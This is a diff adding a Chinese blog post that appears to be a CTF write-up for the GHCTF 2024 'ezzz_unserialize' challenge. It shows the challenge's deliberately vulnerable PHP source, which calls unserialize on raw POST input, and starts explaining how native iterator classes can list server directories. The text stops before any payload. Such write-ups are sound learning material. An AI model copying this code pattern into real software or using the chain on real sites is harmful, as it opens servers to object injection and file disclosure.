@@ -1,0 +1,1029 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/Suzen.jpg">
+  <link rel="icon" href="/img/Suzen.jpg">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#4F4F4F">
+  <meta name="author" content="Suzen">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="题目源码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101">
+<meta property="og:type" content="article">
+<meta property="og:title" content="[GHCTF 2024 新生赛]ezzz_unserialize">
+<meta property="og:url" content="https://yschen20.github.io/2025/12/16/GHCTF-2024-%E6%96%B0%E7%94%9F%E8%B5%9B-ezzz-unserialize/index.html">
+<meta property="og:site_name" content="Suzen">
+<meta property="og:description" content="题目源码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://yschen20.github.io/2025/11/12/0xGame2025-WEB-WP/z-unserialize/image-20251216140100726.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/11/12/0xGame2025-WEB-WP/z-unserialize/image-20251216141029570.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/11/12/0xGame2025-WEB-WP/z-unserialize/image-20251216140735541.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/11/12/0xGame2025-WEB-WP/z-unserialize/image-20251216141633854.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/11/12/0xGame2025-WEB-WP/z-unserialize/image-20251216142041377.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/11/12/0xGame2025-WEB-WP/z-unserialize/image-20251216142227247.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/11/12/0xGame2025-WEB-WP/z-unserialize/image-20251216144024126.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/11/12/0xGame2025-WEB-WP/z-unserialize/image-20251216145308407.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/11/12/0xGame2025-WEB-WP/z-unserialize/image-20251216145920898.png">
+<meta property="article:published_time" content="2025-12-16T06:58:15.000Z">
+<meta property="article:modified_time" content="2025-12-16T07:00:12.921Z">
+<meta property="article:author" content="Suzen">
+<meta property="article:tag" content="PHP原生类">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://yschen20.github.io/2025/11/12/0xGame2025-WEB-WP/z-unserialize/image-20251216140100726.png">
+<meta name="twitter:creator" content="@Suzen">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>[GHCTF 2024 新生赛]ezzz_unserialize - Suzen</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+  
+<link rel="stylesheet" href="/css/glassbg.css">
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"yschen20.github.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2025-04-25T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body><!-- hexo injector body_begin start --><div id="web_bg"></div><!-- hexo injector body_begin end -->
+
+    
+
+<style type="text/css">
+  @keyframes spin3D {
+    from {
+      transform: rotate3d(0.5, 0.5, 0.5, 360deg);
+    }
+
+    to {
+      transform: rotate3d(0deg);
+    }
+  }
+
+  #loading {
+    height: 100%;
+    background-color: #172d4781;
+    backdrop-filter: saturate(100%) blur(10px);
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    position: fixed;
+    top: 0;
+    left: 0;
+    right: 0;
+    overflow: hidden;
+    z-index: 99999999;
+  }
+
+  .spinner-box {
+    width: 300px;
+    height: 300px;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    background-color: transparent;
+  }
+
+  .leo {
+    position: absolute;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    border-radius: 50%;
+  }
+
+  .blue-orbit {
+    width: 175px;
+    height: 175px;
+    border: 2px solid #1a91fa;
+    animation: spin3D 3s linear .2s infinite;
+  }
+
+  .green-orbit {
+    width: 135px;
+    height: 135px;
+    border: 2px solid #00ffdd;
+    animation: spin3D 2s linear 0s infinite;
+  }
+
+  .red-orbit {
+    width: 100px;
+    height: 100px;
+    border: 2px solid #d75151;
+    animation: spin3D 1s linear 0s infinite;
+  }
+
+  .white-orbit-a {
+    width: 70px;
+    height: 70px;
+    border: 1px solid #faf5f5;
+    animation: spin3D 3s linear 0s infinite;
+  }
+
+  .white-orbit-b {
+    width: 70px;
+    height: 70px;
+    border: 1px solid #faf5f5;
+    animation: spin3D 1.5s linear 0s infinite;
+  }
+
+  .nucleus {
+    width: 1px;
+    height: 1px;
+    border: 1px solid #ffffff;
+    animation: spin3D 1s linear 0s infinite;
+  }
+</style>
+
+<div id="loading">
+    <div class="spinner-box">
+        <div class="blue-orbit leo"></div>
+        <div class="green-orbit leo"></div>
+        <div class="red-orbit leo"></div>
+        <div class="white-orbit-a leo"></div>
+        <div class="white-orbit-b leo"></div>
+        <div class="nucleus leo"></div>
+    </div>
+</div>
+
+<script>
+  (function () {
+    const loaded = function () {
+      window.onload = function () {
+        const loader = document.getElementById("loading");
+        loader.className = "fadeout";
+        setTimeout(function () {
+            loader.style.display = "none";
+          },
+                500
+        );
+      }
+    };
+    loaded();
+  })();
+</script>
+
+
+
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 100vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Suzen的博客</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/2.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="[GHCTF 2024 新生赛]ezzz_unserialize"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-author" aria-hidden="true"></i>
+        Suzen
+      </span>
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2025-12-16 14:58" pubdate>
+          2025年12月16日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          1.5k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          13 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="busuanzi_container_page_pv" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="busuanzi_value_page_pv"></span> 次
+        </span>
+        
+
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+        <div class="scroll-down-bar">
+          <i class="iconfont icon-arrowdown"></i>
+        </div>
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">[GHCTF 2024 新生赛]ezzz_unserialize</h1>
+            
+              <p id="updated-time" class="note note-info" style="display: none">
+                
+                  
+                    本文最后更新于 2025-12-16T15:00:12+08:00
+                  
+                  
+
+                
+              </p>
+            
+            
+              <div class="markdown-body">
+                
+                <p>题目源码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Author</span>: hey</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@message</span>: Patience is the key in life,I think you&#x27;ll be able to find vulnerabilities in code audits.</span><br><span class="hljs-comment"> * Have fun and Good luck!!!</span><br><span class="hljs-comment"> */</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Sakura</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$apple</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$strawberry</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$a</span></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span> -&gt; apple = <span class="hljs-variable">$a</span>;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span> -&gt; apple;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$new</span> = <span class="hljs-variable language_">$this</span> -&gt; strawberry;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$new</span>();<br>    &#125;<br><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">NoNo</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$peach</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$string</span></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span> -&gt; peach = <span class="hljs-variable">$string</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$name</span></span>) </span>&#123;<br>        <span class="hljs-variable">$var</span> = <span class="hljs-variable language_">$this</span> -&gt; <span class="hljs-variable">$name</span>;<br>        <span class="hljs-variable">$var</span>[<span class="hljs-variable">$name</span>]();<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">BasaraKing</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$orange</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$cherry</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$arg1</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$arg1</span>,<span class="hljs-variable">$arg2</span></span>)</span>&#123;<br>        <span class="hljs-variable">$function</span> = <span class="hljs-variable language_">$this</span> -&gt; orange;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$function</span>();<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$arg1</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span> -&gt; cherry -&gt; <span class="hljs-title function_ invoke__">ll2</span>(<span class="hljs-string">&#x27;b2&#x27;</span>);<br>    &#125;<br><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">UkyoTachibana</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$banana</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$mangosteen</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$long</span> = @<span class="hljs-variable language_">$this</span> -&gt; banana -&gt; <span class="hljs-title function_ invoke__">add</span>();<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$long</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__set</span>(<span class="hljs-params"><span class="hljs-variable">$arg1</span>,<span class="hljs-variable">$arg2</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span> -&gt; mangosteen -&gt; tt2)<br>        &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Sakura was the best!!!&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">E</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$e</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$arg1</span></span>)</span>&#123;<br>        <span class="hljs-title function_ invoke__">array_walk</span>(<span class="hljs-variable">$this</span>, function (<span class="hljs-variable">$Monday</span>, <span class="hljs-variable">$Tuesday</span>) &#123;<br>            <span class="hljs-variable">$Wednesday</span> = <span class="hljs-keyword">new</span> <span class="hljs-variable">$Tuesday</span>(<span class="hljs-variable">$Monday</span>);<br>            <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$Wednesday</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$Thursday</span>)&#123;<br>                <span class="hljs-keyword">echo</span> (<span class="hljs-variable">$Thursday</span>.<span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>);<br>            &#125;<br>        &#125;);<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">UesugiErii</span></span>&#123;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$coconut</span>;<br><br>    <span class="hljs-keyword">protected</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">addMe</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;My time with Sakura was my happiest time&quot;</span>.<span class="hljs-variable language_">$this</span> -&gt; coconut;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$func</span>, <span class="hljs-variable">$args</span></span>) </span>&#123;<br>        <span class="hljs-title function_ invoke__">call_user_func</span>([<span class="hljs-variable">$this</span>, <span class="hljs-variable">$func</span>.<span class="hljs-string">&quot;Me&quot;</span>], <span class="hljs-variable">$args</span>);<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Heraclqs</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$grape</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$blueberry</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$this</span> -&gt; blueberry)) == <span class="hljs-number">123</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span> -&gt; grape -&gt; hey;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MaiSakatoku</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$Carambola</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$Kiwifruit</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__set</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>, <span class="hljs-variable">$value</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span> -&gt; <span class="hljs-variable">$name</span> = <span class="hljs-variable">$value</span>;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span> -&gt; Kiwifruit = <span class="hljs-string">&quot;Sakura&quot;</span>)&#123;<br>            <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$this</span>-&gt; Carambola);<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;GHCTF&#x27;</span>])) &#123;<br>    <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;GHCTF&#x27;</span>]);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><br><br><br></code></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">E</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$e</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$arg1</span></span>)</span>&#123;<br>        <span class="hljs-title function_ invoke__">array_walk</span>(<span class="hljs-variable">$this</span>, function (<span class="hljs-variable">$Monday</span>, <span class="hljs-variable">$Tuesday</span>) &#123;<br>            <span class="hljs-variable">$Wednesday</span> = <span class="hljs-keyword">new</span> <span class="hljs-variable">$Tuesday</span>(<span class="hljs-variable">$Monday</span>);<br>            <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$Wednesday</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$Thursday</span>)&#123;<br>                <span class="hljs-keyword">echo</span> (<span class="hljs-variable">$Thursday</span>.<span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>);<br>            &#125;<br>        &#125;);<br>    &#125;<br>&#125; <br></code></pre></td></tr></table></figure>
+
+<p>其中看到 E 这个类，在<code>__get()</code>魔术方法中调用了<code>array_walk()</code>函数，传入的第一个参数就是<code>$this</code>，就会遍历当前对象的所有属性，然后对每个属性调用回调函数，其中的<code>$Monday</code>是属性值，<code>$Tuesday</code>是属性名</p>
+<blockquote>
+<p>在 PHP 中，<code>array_walk()</code> 是一个用于遍历数组并对每个元素应用自定义回调函数的内置函数，它可以直接修改数组元素（通过引用），核心作用是<strong>对数组的每个元素执行指定操作</strong>。</p>
+</blockquote>
+<p>举个例子</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$test1</span> = <span class="hljs-string">&quot;hello&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$test2</span> = <span class="hljs-string">&quot;world&quot;</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$arg1</span></span>)</span>&#123;<br>        <span class="hljs-title function_ invoke__">array_walk</span>(<span class="hljs-variable">$this</span>, function(<span class="hljs-variable">$a</span>, <span class="hljs-variable">$b</span>)&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable">$a</span>.<span class="hljs-string">&quot;\n&quot;</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable">$b</span>.<span class="hljs-string">&quot;\n&quot;</span>;<br>        &#125;);<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Test</span>();<br><span class="hljs-variable">$a</span>-&gt;non_existent;	<span class="hljs-comment">// 触发__get()魔术方法</span><br><span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><br></code></pre></td></tr></table></figure>
+
+<p><img src="/2025/11/12/0xGame2025-WEB-WP/z-unserialize/image-20251216140100726.png" srcset="/img/loading.gif" lazyload alt="image-20251216140100726"></p>
+<p>然后如果了解了一些 PHP 原生类的知识，回调函数中的代码就会感觉有点熟悉</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$Wednesday</span> = <span class="hljs-keyword">new</span> <span class="hljs-variable">$Tuesday</span>(<span class="hljs-variable">$Monday</span>);<br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$Wednesday</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$Thursday</span>)&#123;<br>    <span class="hljs-keyword">echo</span> (<span class="hljs-variable">$Thursday</span>.<span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>就比如使用原生类<code>DirectoryIterator</code>、<code>FilesystemIterator</code>、<code>GlobIterator </code>，这些可以遍历目录的类</p>
+<blockquote>
+<p>博客文章：<a target="_blank" rel="noopener" href="https://blog.csdn.net/cjdgg/article/details/115314651">https://blog.csdn.net/cjdgg/article/details/115314651</a></p>
+</blockquote>
